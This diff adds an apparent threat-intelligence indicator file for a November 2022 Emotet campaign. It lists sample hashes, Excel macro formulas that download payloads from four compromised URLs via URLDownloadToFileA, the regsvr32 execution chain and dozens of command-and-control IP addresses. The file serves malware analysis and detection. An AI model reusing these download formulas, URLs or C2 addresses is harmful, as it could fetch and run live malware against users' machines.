@@ -1,0 +1,119 @@
+Emotet 2022 | epoch4 | 2022.11.07
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.zip 3986eac8cad48d70f94b8b873055fa67ee1afb93c4038b89b47f2ee4038f3961
+.zip fb784a096c10860167ce3f506961c21cd4f3e8daa63a16e7656290673dc40fc5
+.xls 48b2c5bcc179258578a14fa8047f0e7813eaec00e2ef5cb8e29500c64bd0ba47 
+
+
+# --------------------------------------------------------- #
+# -------------------------- URLS ------------------------- #
+# --------------------------------------------------------- #
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://caimari.com/wp-includes/E3/", "..\oxnv1.ooccxx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://www.detertecnica.com/var/yROsVkd/", "..\oxnv2.ooccxx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://borntobefree.org.za/d3hEMgx7B/gKjYZXet98DzbCPzMsQ/", "..\oxnv3.ooccxx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://bigm.ir/wp-admin/jzIV5U90h9qbK7WK8RTZ/", "..\oxnv4.ooccxx")
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://private.tria.ge/221107-r1xlyarzzf
+
+
+# --------------------------------------------------------- #
+# ------------------------ DOMAINS ------------------------ #
+# --------------------------------------------------------- #
+https://caimari.com/wp-includes/E3/
+http://www.detertecnica.com/var/yROsVkd/
+http://borntobefree.org.za/d3hEMgx7B/gKjYZXet98DzbCPzMsQ/
+http://bigm.ir/wp-admin/jzIV5U90h9qbK7WK8RTZ/
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE
+"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\PO 2022-11-07_0923.xls"
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe /S ..\oxnv1.ooccxx
+
+        C:\Windows\system32\regsvr32.exe
+        C:\Windows\system32\regsvr32.exe "C:\Windows\system32\ZTVIYQzDTt\zWnXRMgIucTQJwFn.dll"
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe /S ..\oxnv2.ooccxx
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe /S ..\oxnv3.ooccxx
+
+        C:\Windows\system32\regsvr32.exe
+        C:\Windows\system32\regsvr32.exe "C:\Windows\system32\UFrcvoVIs\woEBDo.dll"
+
+    C:\Windows\System32\regsvr32.exe
+    C:\Windows\System32\regsvr32.exe /S ..\oxnv4.ooccxx
+
+        C:\Windows\system32\regsvr32.exe
+        C:\Windows\system32\regsvr32.exe "C:\Windows\system32\EXimsUi\HJtY.dll"
+
+
+# --------------------------------------------------------- #
+# -------------------------- C2s -------------------------- #
+# --------------------------------------------------------- #
+45.235.8.30:8080
+94.23.45.86:4143
+119.59.103.152:8080
+169.60.181.70:8080
+164.68.99.3:8080
+172.105.226.75:8080
+107.170.39.149:8080
+206.189.28.199:8080
+1.234.2.232:8080
+188.44.20.25:443
+186.194.240.217:443
+103.43.75.120:443
+149.28.143.92:443
+159.89.202.34:443
+209.97.163.214:443
+183.111.227.137:8080
+129.232.188.93:443
+139.59.126.41:443
+110.232.117.186:8080
+139.59.56.73:8080
+103.75.201.2:443
+91.207.28.33:8080
+164.90.222.65:443
+197.242.150.244:8080
+212.24.98.99:8080
+51.161.73.194:443
+115.68.227.76:8080
+159.65.88.10:8080
+201.94.166.162:443
+95.217.221.146:8080
+173.212.193.249:8080
+82.223.21.224:8080
+103.132.242.26:8080
+213.239.212.5:443
+153.126.146.25:7080
+45.176.232.124:443
+182.162.143.56:443
+169.57.156.166:8080
+159.65.140.115:443
+163.44.196.120:8080
+172.104.251.154:8080
+167.172.253.162:8080
+91.187.140.35:8080
+45.118.115.99:8080
+147.139.166.154:8080
+72.15.201.15:8080
+149.56.131.28:8080
+167.172.199.165:8080
+101.50.0.91:8080
+160.16.142.56:8080
+185.4.135.165:8080
+104.168.155.143:8080
+79.137.35.198:8080
+5.135.159.50:443
+187.63.160.88:80
